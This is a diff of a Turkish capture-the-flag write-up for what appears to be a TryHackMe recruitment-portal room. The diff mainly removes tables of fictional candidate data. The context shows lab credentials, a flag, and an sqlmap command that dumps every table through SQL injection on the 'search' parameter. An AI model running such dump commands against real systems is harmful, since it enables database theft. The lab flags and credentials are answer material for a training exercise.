@@ -99,22 +99,11 @@ Elde ettiğim `hr / hrpassword123` bilgileriyle login sayfasından giriş yaptı
 ```
 FLAG 1: THM{LOGGED_IN_USER}
 ```
-
-Giriş yaptıktan sonra panelde aday (candidate) bilgilerini içeren bir tablo ile karşılaştım:
-
-| ID | Name          | Position            | Status       |
-|----|---------------|----------------------|--------------|
-| 1  | Alice Johnson | Frontend Developer   | Approved     |
-| 2  | Bob Smith     | Backend Developer    | Under Review |
-| 3  | Charlie Brown | Security Analyst     | Rejected     |
-| 4  | Diana Prince  | HR Executive         | Selected     |
-
-
 ---
 
 ## SQL Injection ile Admin Bilgisini Ele Geçirme
 
-Panelde bir **arama (search)** alanı bulunuyordu ve bu tür kullanıcı girdisi alan alanlar her zaman SQL Injection açısından test edilmeyi hak eder. Manuel testin zaman alacağını düşünerek, ilgili isteği Burp Suite ile yakalayıp `req.txt` dosyasına kaydettim ve `sqlmap` ile otomatik tarama gerçekleştirdim.
+Panelde bir **arama ** alanı bulunuyordu ve bu tür kullanıcı girdisi alan alanlar her zaman SQL Injection açısından test edilmeyi hak eder. Manuel testin zaman alacağını düşünerek, ilgili isteği Burp Suite ile yakalayıp `req.txt` dosyasına kaydettim ve `sqlmap` ile otomatik tarama gerçekleştirdim.
 
 ### Veritabanlarının Listelenmesi
 
@@ -179,19 +168,6 @@ sqlmap -r req.txt -p search -D recruit_db --dump-all --batch --fresh-queries
 +----+----------------+----------+
 | 1  | admin@001admin | admin    |
 +----+----------------+----------+
-```
-
-**candidates tablosu:**
-
-```
-+----+---------------+--------------+--------------------+
-| id | name          | status       | position           |
-+----+---------------+--------------+--------------------+
-| 1  | Alice Johnson | Approved     | Frontend Developer |
-| 2  | Bob Smith     | Under Review | Backend Developer  |
-| 3  | Charlie Brown | Rejected     | Security Analyst   |
-| 4  | Diana Prince  | Selected     | HR Executive        |
-+----+---------------+--------------+--------------------+
 ```
 
 <img width="1236" height="616" alt="alldatabase" src="https://github.com/user-attachments/assets/9f1e3c56-2d0c-418d-93dc-7013365a28ea" />
